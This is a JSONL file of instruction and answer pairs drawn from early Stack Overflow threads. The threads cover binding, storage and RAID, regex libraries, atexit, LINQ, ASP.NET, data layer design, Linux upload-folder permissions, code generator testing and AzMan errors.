{"instruction": "What is the difference between early and late binding?", "output": "Taken directly from http://word.mvps.org/fAQs/InterDev/EarlyvsLateBinding.htm\n\nThere are two ways to use Automation (or OLE Automation) to\n  programmatically control another application.\nLate binding uses CreateObject to create and instance of the\n  application object, which you can then control. For example, to create\n  a new instance of Excel using late binding:\n Dim oXL As Object\n Set oXL = CreateObject(\"Excel.Application\")\n\nOn the other hand, to manipulate an existing instance of Excel (if\n  Excel is already open) you would use GetObject (regardless whether\n  you're using early or late binding):\n Dim oXL As Object\n Set oXL = GetObject(, \"Excel.Application\")\n\nTo use early binding, you first need to set a reference in your\n  project to the application you want to manipulate. In the VB Editor of\n  any Office application, or in VB itself, you do this by selecting\n  Tools + References, and selecting the application you want from the\n  list (e.g. \u201cMicrosoft Excel 8.0 Object Library\u201d).\nTo create a new instance of Excel using early binding:\n Dim oXL As Excel.Application\n Set oXL = New Excel.Application\n\nIn either case, incidentally, you can first try to get an existing\n  instance of Excel, and if that returns an error, you can create a new\n  instance in your error handler."}
{"instruction": "What is the difference between early and late binding?", "output": "In compiled languages, the difference is stark.\nJava:\n//early binding:\npublic create_a_foo(*args) {\n return new Foo(args)\n}\nmy_foo = create_a_foo();\n\n//late binding:\npublic create_something(Class klass, *args) {\n  klass.new_instance(args)\n}\nmy_foo = create_something(Foo);\n\nIn the first example, the compiler can do all sorts of neat stuff at compile time.  In the second, you just have to hope that whoever uses the method does so responsibly.  (Of course, newer JVMs support the Class<? extends Foo> klass structure, which can greatly reduce this risk.)\nAnother benefit is that IDEs can hotlink to the class definition, since it's declared right there in the method.  The call to createsomething(Foo) might be _very far from the method definition, and if you're looking at the method definition, it might be nice to see the implementation.\nThe major advantage of late binding is that it makes things like inversion-of-control easier, as well as certain other uses of polymorphism and duck-typing (if your language supports such things)."}
{"instruction": "What is the difference between early and late binding?", "output": "In interpreted languages, the difference is a little more subtle.\nRuby:\n# early binding:\ndef create_a_foo(*args)\n  Foo.new(*args)\nend\nmy_foo = create_a_foo\n\n# late binding:\ndef create_something(klass, *args)\n  klass.new(*args)\nend\nmy_foo = create_something(Foo)\n\nBecause Ruby is (generally) not compiled, there isn't a compiler to do the nifty up-front stuff.  The growth of JRuby means that more Ruby is compiled these days, though, making it act more like Java, above.\nThe issue with IDEs still stands: a platform like Eclipse can look up class definitions if you hard-code them, but cannot if you leave them up to the caller.\nInversion-of-control is not terribly popular in Ruby, probably because of its extreme runtime flexibility, but Rails makes great use of late binding to reduce the amount of configuration necessary to get your application going."}
{"instruction": "What is the difference between early and late binding?", "output": "The short answer is that early (or static) binding refers to compile time binding and late (or dynamic) binding refers to runtime binding (for example when you use reflection)."}
{"instruction": "So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.\nHere are some of the options:\n\nJBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable\nNAS - Slow but cheap and expandable, probably best for backups\nDAS - A decent compromise, but generally accessible from only one or two machines\nSAN - Expensive but very good\n\nHow much should you worry about choosing a 15k drive over a 10k or 7200RPM?\nWhat's your favorite RAID level?", "output": "Just to get this started, I am using a Dell MD3000 direct attached storage device, connected via redundant HBA cards.  It has 9x146Gb 15K drives, arranged in 4 RAID 1 arrays with 1 hot spare standing by.  Total data footprint is approaching 200Gb.  I'm not thrilled with the IO performance, but it's getting the job done."}
{"instruction": "Does anyone use have a good regex library that they like to use? Most of the regexes that you find online either contain bugs or are so focused on the edge cases that it turns into a competition to validate whatever spec 100%. Of course you can write your own, but when you are billing by the hour its handy to have a library around.", "output": "Besides being pretty much the best Regex tool on the market (seriously), RegexBuddy is about the only tool I know of that lets you switch amongst different Regex rendering engines.\nhttp://www.regexbuddy.com/\nSee info here:\nhttp://en.wikipedia.org/wiki/RegexBuddy\n\nRegexBuddy's proprietary regular expression engine allows the software to emulate the rules and limitations of numerous popular regular expression flavors."}
{"instruction": "Does anyone use have a good regex library that they like to use? Most of the regexes that you find online either contain bugs or are so focused on the edge cases that it turns into a competition to validate whatever spec 100%. Of course you can write your own, but when you are billing by the hour its handy to have a library around.", "output": "Lately, I do all my text parsing in Perl.  If I needed regex's in another language, I'd go with PCRE.\n\nThe PCRE library is a set of functions that implement regular\n     expression pattern matching using the same syntax and semantics as\n     Perl\u00a05. PCRE has its own native API, as well as a set of\n     wrapper functions that correspond to the POSIX regular expression\n     API. The PCRE library is free, even for building commercial\n     software.\nPCRE was originally written for the\n     Exim MTA,\n     but is now used by many high-profile open source projects, including\n     Apache,\n     PHP,\n     KDE,\n     Postfix,\n     Analog, and\n     Nmap.\n     PCRE has also found its way into some well known commercial products, like\n     Apple Safari.\n     Some other interesting projects using PCRE include\n     Chicken,\n     Ferite,\n     Onyx,\n     Hypermail,\n     Leafnode,\n     Askemos,\n     and Wenlin.\n\nPCRE is mature, and has the support of numerous projects.  Apache and Apple both have a vested interest in making it high-quality.  I doubt that any other RE library is likely to surpass it in both functionality and quality (or possibly either) anytime soon."}
{"instruction": "Does anyone use have a good regex library that they like to use? Most of the regexes that you find online either contain bugs or are so focused on the edge cases that it turns into a competition to validate whatever spec 100%. Of course you can write your own, but when you are billing by the hour its handy to have a library around.", "output": "You can search for regular expression in regexlib."}
{"instruction": "So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.\nHere are some of the options:\n\nJBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable\nNAS - Slow but cheap and expandable, probably best for backups\nDAS - A decent compromise, but generally accessible from only one or two machines\nSAN - Expensive but very good\n\nHow much should you worry about choosing a 15k drive over a 10k or 7200RPM?\nWhat's your favorite RAID level?", "output": "We have a database cluster attached to a NAS, also with redundant HBA.  The NAS units are RAID-10.  From our storage-meister, for databases the higher RPM the better."}
{"instruction": "Is there any difference between\n   int on_exit(void (*function)(int , void *), void *arg);\n\nand\n   int atexit(void (*function)(void));\n\nother than the fact that the function used by on_exit gets the exit status?\nThat is, if I don't care about the exit status, is there any reason to use one or the other?\nEdit: Many of the answers warned against on_exit because it's non-standard. If I'm developing an app that is for internal corporate use and guaranteed to run on specific configurations, should I worry about this?", "output": "You should use atexit() if possible.  on_exit() is nonstandard and less common.  For example, it's not available on OS X.\nKernel.org - on_exit():\n\nThis function comes from SunOS 4, but is also present in libc4, libc5 and\n  glibc.  It no longer occurs in Solaris (SunOS 5).  Avoid this function, and\n  use the standard atexit(3) instead."}
{"instruction": "Is there any difference between\n   int on_exit(void (*function)(int , void *), void *arg);\n\nand\n   int atexit(void (*function)(void));\n\nother than the fact that the function used by on_exit gets the exit status?\nThat is, if I don't care about the exit status, is there any reason to use one or the other?\nEdit: Many of the answers warned against on_exit because it's non-standard. If I'm developing an app that is for internal corporate use and guaranteed to run on specific configurations, should I worry about this?", "output": "According to this link I found, it seems there are a few differences.  on_exit will let you pass in an argument that is passed in to the on_exit function when it is called... which might let you set up some pointers to do some cleanup work on when it is time to exit.\nFurthermore, it appears that on_exit was a SunOS specific function that may not be compatible on all platforms... so you may want to stick with atexit, despite it being more restrictive."}
{"instruction": "Does anyone use have a good regex library that they like to use? Most of the regexes that you find online either contain bugs or are so focused on the edge cases that it turns into a competition to validate whatever spec 100%. Of course you can write your own, but when you are billing by the hour its handy to have a library around.", "output": "e-texteditor hilights what you're searching for as you type it. This is incredibly useful, as you can paste your 'sample text' into a file, and just type your regex into the search field, and see what it's matching right in front of you.\nNone of these 'visual regex builder' things are substitutes for actually LEARNING regular expressions."}
{"instruction": "So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.\nHere are some of the options:\n\nJBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable\nNAS - Slow but cheap and expandable, probably best for backups\nDAS - A decent compromise, but generally accessible from only one or two machines\nSAN - Expensive but very good\n\nHow much should you worry about choosing a 15k drive over a 10k or 7200RPM?\nWhat's your favorite RAID level?", "output": "The biggest performance boost you can get is by partitioning tables/indexes onto different disks. The first step would be to put indexes on one disk and data on an other. After this you should consider which tables/indexes are used together, and put them on separate disks (\"spindles\") when possible."}
{"instruction": "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well?", "output": "You should check out the QTKit Capture documentation.\nOn Leopard, you can get at all of it over the RubyCocoa bridge:\nrequire 'osx/cocoa'\nOSX.require_framework(\"/System/Library/Frameworks/QTKit.framework\")\n\nOSX::QTCaptureDevice.inputDevices.each do |device|\n    puts device.localizedDisplayName\nend"}
{"instruction": "We have a remoting singleton server running in a separate windows service (let's call her RemotingService). The clients of the RemotingService are ASP.NET instances (many many).\nCurrently, the clients remoting call RemotingService and blocks while the RemotingService call is serviced. However, the remoting service is getting complicated enough (with more RPC calls and complex algorithms) that the asp.net worker threads are blocked for a significantly long time (4-5 seconds).\nAccording to this msdn article, doing this will not scale well because an asp.net worker thread is blocked for each remoting RPC. It advises switching to async handlers to free up asp.net worker threads.\n\nThe purpose of an asynchronous handler\n  is to free up an ASP.NET thread pool\n  thread to service additional requests\n  while the handler is processing the\n  original request.\n\nThis seems fine, except the remoting call still takes up a thread from the thread pool.\nIs this the same thread pool as the asp.net worker threads? \nHow should I go about turning my remoting singleton server into an async system such that I free up my asp.net worker threads?\nI've probably missed out some important information, please let me know if there is anything else you need to know to answer the question.", "output": "The idea behind using the ThreadPool is that through it you can control the amount of synchronous threads, and if those get too many, then the thread pool automatically manages the waiting of newer threads.\nThe Asp.Net worked thread (AFAIK) doesn't come from the Thread Pool and shouldn't get affected by your call to the remoting service (unless this is a very slow processor, and your remoting function is very CPU intensive - in which case, everything on your computer will be affected).\nYou could always host the remoting service on a different physical server. In that case, your asp.net worker thread will be totally independent of your remoting call (if the remoting call is called on a separate thread that is)."}
{"instruction": "Is there any difference between\n   int on_exit(void (*function)(int , void *), void *arg);\n\nand\n   int atexit(void (*function)(void));\n\nother than the fact that the function used by on_exit gets the exit status?\nThat is, if I don't care about the exit status, is there any reason to use one or the other?\nEdit: Many of the answers warned against on_exit because it's non-standard. If I'm developing an app that is for internal corporate use and guaranteed to run on specific configurations, should I worry about this?", "output": "@Nathan\nFirst, see if there is another API call to determine exit status... a quick glance and I don't see one, but I am not well versed in the standard C API.\nAn easy alternative is to have a global variable that stores the exit status... the default being an unknown error cause (for if the program terminates abnormally).  Then, when you call exit, you can store the exit status in the global and retrieve it from any atexit functions.  This requires storing the exit status diligently before every exit call, and clearly is not ideal, but if there is no API and you don't want to risk on_exit not being on the platform... it might be the only option."}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "A bit old but still relevant:\nhttp://www.developerzen.com/2007/09/17/introduction-to-linq/"}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "I recommend the Hooked On LINQ wiki. They've got some great introductory info, as well as more in depth info and samples on all of the operators.\nI listed a lot of LINQ references in the show notes for Herding Code Episode 10 (on LINQ). One of my favorites is an MSDN Magazine article which explains how LINQ works from a framework perspective in a way which really helped me understand how it works."}
{"instruction": "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\nWhat is LINQ and how do I get started?\nLinks guides or documentation a bonus :)\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL", "output": "From MSDN, here are some papers, written by Anders and others:\n\nLINQ: .NET Language-Integrated Query\nLINQ to SQL: .NET Language-Integrated Query for Relational Data\n\nPS after writing this, I see someone has already linked to these, but buried inside a paragraph, so I'll keep them pulled out here in list form as well."}
{"instruction": "Is there any difference between\n   int on_exit(void (*function)(int , void *), void *arg);\n\nand\n   int atexit(void (*function)(void));\n\nother than the fact that the function used by on_exit gets the exit status?\nThat is, if I don't care about the exit status, is there any reason to use one or the other?\nEdit: Many of the answers warned against on_exit because it's non-standard. If I'm developing an app that is for internal corporate use and guaranteed to run on specific configurations, should I worry about this?", "output": "@Nathan, I can't find any function that will return the exit code for the current running process.  I expect that it isn't set yet at the point when atexit() is called, anyway.  By this I mean that the runtime knows what it is, but probably hasn't reported it to the OS.  This is pretty much just conjecture, though.\nIt looks like you will either need to use on_exit() or structure your program so that the exit code doesn't matter.  It would not be unreasonable to have the last statement in your main function flip a global exited_cleanly variable to true.  In the function you register with atexit(), you could check this variable to determine how the program exited.  This will only give you two states, but I expect that would be sufficient for most needs.  You could also expand this type of scheme to support more exit states if necessary."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "As others have said, there's a good list at www.asp.net/learn. I think the biggest ASP.NET specific changes are:\n\nOfficial ASP.NET AJAX integration\nListView (much better than the GridView / DataView in that they let you write out clean HTML)\nBig improvements to the IDE for CSS / HTML editing\nJavascript debugging\n\nNote that ASP.NET MVC is not released yet, and was definitely not included with ASP.NET 3.5."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "For ASP.NET, you have a lot of improvements:\n\nsplit view (code and design)\nfaster switching between code and design view\nembedded master pages (one master page in another)\njavascript debugging\n\nAnyway most of the useful stuff are really in the meat of the language, and for .NET 3.5 the new language features for C# 3.0 will be (and yes, I find ALL of them useful)\n\nanonymous objects\nautomatic properties\nobject initializers\ncollection initializers (inline initialization for collections)\nimplicit typing (var keyword)\nlambda expressions\nLINQ\nExtension methods\n\nI might have forgotten a few, but I think this is about most of the new cool and useful stuff."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "Here's a brief list of my favourites:\n\nLINQ\nExtension Methods\nLambda Methods\n\nAnd I don't actually use ASP.NET, but ASP.NET AJAX is now included in 3.5 too and ASP.NET MVC is included in 3.5 SP1."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "An excellent book I have, which covers this topic, is Data Access Patterns, by Clifton Nock.  It has got many good explanations and good ideas on how to decouple your business layer from the persistence layer.  You really should give it a try.  It's one of my favorite books."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "One trick I've found handy is to have my data layer be \"collection agnostic\". That is, whenever I want to return a list of objects from my data layer, I get the caller to pass in the list. So instead of this:\npublic IList<Foo> GetFoosById(int id) { ... }\n\nI do this:\npublic void GetFoosById(IList<Foo> foos, int id) { ... }\n\nThis lets me pass in a plain old List if that's all I need, or a more intelligent implementation of IList<T> (like ObservableCollection<T>) if I plan to bind to it from the UI. This technique also lets me return stuff from the method like a ValidationResult containing an error message if one occurred.\nThis still means that my data layer knows about my object definitions, but it gives me one extra degree of flexibility."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "Check out Linq to SQL, if I were creating a new application right now I would consider relying on an entirely Linq based data layer.\nOther than that I think it's good practise to de-couple data and logic as much as possible, but that isn't always practical.  A pure separation between logic and data access makes joins and optimisations difficult, which is what makes Linq so powerful."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "You can have both. Let data layer not know of your bussiness objects and make it capable of working with more than one type of data sources. If you supply a common interface (or an abstract class) for interacting with data, you can have different implementations for each type of data source. Factory pattern goes well here."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "Jeffrey Palermo wrote a good post about this. He called it Onion Architecture."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "In applications wherein we use NHibernate, the answer becomes \"somewhere in between\", in that, while the XML mapping definitions (they specify which table belongs to which object and which columns belong to which field, etc) are clearly in the business object tier. \nThey are passed to a generic data session manager which is not aware of any of the business objects; the only requirement is that the business objects passed to it for CRUD have to have a mapping file."}
{"instruction": "I am in the middle of a \"discussion\" with a colleague about the best way to implement the data layer in a new application.\nOne viewpoint is that the data layer should be aware of business objects (our own classes that represent an entity), and be able to work with that object natively.  \nThe opposing viewpoint is that the data layer should be object-agnostic, and purely handle simple data types (strings, bools, dates, etc.)\nI can see that both approaches may be valid, but my own viewpoint is that I prefer the former.  That way, if the data storage medium changes, the business layer doesn't (necessarily) have to change to accommodate the new data layer.  It would therefore be a trivial thing to change from a SQL data store to a serialized xml filesystem store.\nMy colleague's point of view is that the data layer shouldn't have to know about object definitions, and that as long as the data is passed about appropriately, that is enough.  \nNow, I know that this is one of those questions that has the potential to start a religious war, but I'd appreciate any feedback from the community on how you approach such things.  \nTIA", "output": "It really depends on your view of the world - I used to be in the uncoupled camp. The DAL was only there to supply data to the BAL - end of story.\nWith emerging technologies such as Linq to SQL and Entity Framework becoming a bit more popular, then the line between DAL and BAL have been blurred a bit. In L2S especially your DAL is quite tightly coupled to the Business objects as the object model has a 1-1 mapping to your database field.\nLike anything in software development there is no right or wrong answer. You need to understand your requirements and future requirments and work from there. I would no more use a Ferrari on the Dakhar rally as I would a Range Rover on a track day."}
{"instruction": "I'm integrating .NET support into our C++ application.\nIt's an old-school MFC application, with 1 extra file compiled with the \"/clr\" option that references a CWinFormsControl.\nI'm not allowed to remove the linker flag \"/NODEFAULTLIB\".\n(We have our own build management system, not Visual Studio's.)\nThis means I have to specify all necessary libraries: VC runtime and MFC.\nOther compiler options include \"/MD\"\nNext to that: I can't use the linker flag \"/FORCE:MULTIPLE\" and just add everything:\nI'm looking for a non-overlapping set of libraries.", "output": "How I solved it: \n\nlink with \"/FORCE:MULTIPLE /verbose\" (that links ok) and set the output aside.\nlink with \"/NODEFAULTIB /verbose\" and trace all unresolveds in the output of the previous step and add the libraries 1 by 1. \nThis resulted in doubles: \"AAA.lib: XXX already defined in BBB.lib\"\nThen I finally got it:\nRecompiled managed AND unmanaged units with /MD\nand link to (among others):\nmscoree.lib\nmsvcmrt.lib\nmfcm80d.lib\n\nMixing /MT (unmanaged) and /MD (managed) turned out to be the bad idea: \ndifferent(overlapping) libraries are needed.\n@ajryan: Dependcy Walker only tells me what dll's are used, not what libraries are linked to when linking.\n(e.g. msvcmrt.lib ?)\nI think.\nThanks for the answers!\nJan"}
{"instruction": "I'm looking for a good article on using emacs as C/C++ IDE.\nSomething like Steve Yegge's \"Effective emacs\".", "output": "No specific article, really, but I've found EmacsWiki to be full of useful information. Consider checking out these entries:\n\nCPlusPlus as a starting point for many C++-related articles, and\nCppTemplate to define a template that can give you a good skeleton when you start new files"}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "String.IsNullOrEmpty() only works on .net 2.0 and above, for .net 1/1.1, I tend to use:\nif (inputString == null || inputString == String.Empty)\n{\n    // String is null or empty, do something clever here. Or just expload.\n}\n\nI use String.Empty as opposed to \"\" because \"\" will create an object, whereas String.Empty wont - I know its something small and trivial, but id still rather not create objects when I dont need them! (Source)"}
{"instruction": "Sorry for the basic question - I'm a .NET developer and don't have much experience with LAMP setups.\nI have a PHP site that will allow uploads to a specific folder. I have been told that this folder needs to be owned by the webserver user for the upload process to work, so I created the folder and then set permissions as such:\nchown apache:apache -R uploads/\nchmod 755 -R uploads/\n\nThe only problem now is that the FTP user can not modify the uploaded files at all.\nIs there a permission setting that will allow me to still upload files and then modify them later as a user other than the webserver user?", "output": "Or at least 766.\n\nread = 4\nwrite = 2\nexecute = 1\n\n7 = read + write + execute\n6 = read + write\n\nfirst number: owner\nsecond number: group\nthird number: other users"}
{"instruction": "Sorry for the basic question - I'm a .NET developer and don't have much experience with LAMP setups.\nI have a PHP site that will allow uploads to a specific folder. I have been told that this folder needs to be owned by the webserver user for the upload process to work, so I created the folder and then set permissions as such:\nchown apache:apache -R uploads/\nchmod 755 -R uploads/\n\nThe only problem now is that the FTP user can not modify the uploaded files at all.\nIs there a permission setting that will allow me to still upload files and then modify them later as a user other than the webserver user?", "output": "You can create a new group with both the apache user and FTP user as members and then make the permission on the upload folder 775.  This should give both the apache and FTP users the ability to write to the files in the folder but keep everyone else from modifying them."}
{"instruction": "Sorry for the basic question - I'm a .NET developer and don't have much experience with LAMP setups.\nI have a PHP site that will allow uploads to a specific folder. I have been told that this folder needs to be owned by the webserver user for the upload process to work, so I created the folder and then set permissions as such:\nchown apache:apache -R uploads/\nchmod 755 -R uploads/\n\nThe only problem now is that the FTP user can not modify the uploaded files at all.\nIs there a permission setting that will allow me to still upload files and then modify them later as a user other than the webserver user?", "output": "I will add that if you are using SELinux that you need to make sure the type context is tmp_t  You can accomplish this by using the chcon utility\n\nchcon -t tmp_t uploads"}
{"instruction": "Sorry for the basic question - I'm a .NET developer and don't have much experience with LAMP setups.\nI have a PHP site that will allow uploads to a specific folder. I have been told that this folder needs to be owned by the webserver user for the upload process to work, so I created the folder and then set permissions as such:\nchown apache:apache -R uploads/\nchmod 755 -R uploads/\n\nThe only problem now is that the FTP user can not modify the uploaded files at all.\nIs there a permission setting that will allow me to still upload files and then modify them later as a user other than the webserver user?", "output": "I would go with Ryan's answer if you really want to do this.\nIn general on a *nix environment, you always want to err on giving away as little permissions as possible.\n9 times out of 10, 755 is the ideal permission for this - as the only user with the ability to modify the files will be the webserver. Change this to 775 with your ftp user in a group if you REALLY need to change this.\nSince you're new to php by your own admission, here's a helpful link for improving the security of your upload service:\nmove_uploaded_file"}
{"instruction": "This is a difficult and open-ended question I know, but I thought I'd throw it to the floor and see if anyone had any interesting suggestions.\nI have developed a code-generator that takes our python interface to our C++ code (generated via SWIG) and generates code needed to expose this as WebServices.  When I developed this code I did it using TDD, but I've found my tests to be brittle as hell.  Because each test essentially wanted to verify that for a given bit of input code (which happens to be a C++ header) I'd get a given bit of outputted code I wrote a small engine that reads test definitions from XML input files and generates test cases from these expectations.\nThe problem is I dread going in to modify the code at all.  That and the fact that the unit tests themselves are a: complex, and b: brittle.\nSo I'm trying to think of alternative approaches to this problem, and it strikes me I'm perhaps tackling it the wrong way.  Maybe I need to focus more on the outcome, IE: does the code I generate actually run and do what I want it to, rather than, does the code look the way I want it to.\nHas anyone got any experiences of something similar to this they would care to share?", "output": "I started writing up a summary of my experience with my own code generator, then went back and re-read your question and found you had already touched upon the same issues yourself, focus on the execution results instead of the code layout/look.\nProblem is, this is hard to test, the generated code might not be suited to actually run in the environment of the unit test system, and how do you encode the expected results?\nI've found that you need to break down the code generator into smaller pieces and unit test those. Unit testing a full code generator is more like integration testing than unit testing if you ask me."}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "The framework included with VS9 is .NET, but you can write tests in C++/CLI, so as long as you're comfortable learning some .NET isms, you should be able to test most any C++ code.\nboost.test\n and googletest\nlook to be fairly similar, but adapted for slightly different uses. Both of these have a binary component, so you'll need an extra project in your solution to compile and run the tests.\nThe framework we use is CxxTest, which is much lighter; it's headers only, and uses a Perl (!) script to scrape test suite information from your headers (suites inherit from CxxTest::Base, all your test methods' names start with \"test\"). Obviously, this requires that you get Perl from one source or another, which adds overhead to your build environment setup."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "see Scott Hanselman's post here: http://www.hanselman.com/blog/HiddenGemsNotTheSameOld35SP1Post.aspx"}
{"instruction": "I'm doing a authorization check from a WinForms application with the help of the AzMan authorization provider from Enterprise Library and am receiving the the following error:\n\nUnable to update the password. The value provided as the current password is incorrect. (Exception from HRESULT: 0x8007052B) (Microsoft.Practices.EnterpriseLibrary.Security.AzMan) \n\nUnable to update the password. The value provided as the current password is incorrect. (Exception from HRESULT: 0x8007052B) (Microsoft.Interop.Security.AzRoles) \n\nThe AzMan store is hosted in ADAM on another computer in the same domain. Other computers and users do not have this problem. The user making the call has read access to both ADAM and the AzMan store. The computer running the WinForms app and the computer running ADAM are both on Windows XP SP2.\nI've had access problems with AzMan before that I've resolved, but this is a new one... What am I missing?", "output": "For AzMan with ASP.NET, turn on impersonation in web.config (<identity impersonate=\"true\" username=\"xx\" pasword=\"xx\" />), and make sure with an AD administrator that the impersonation account has \"reader\" permissions on the AzMan store; plus, give write permissions to this account on the Temporary ASP.NET Files folder (under C:\\Windows\\Microsoft.NET\\<framework>)."}
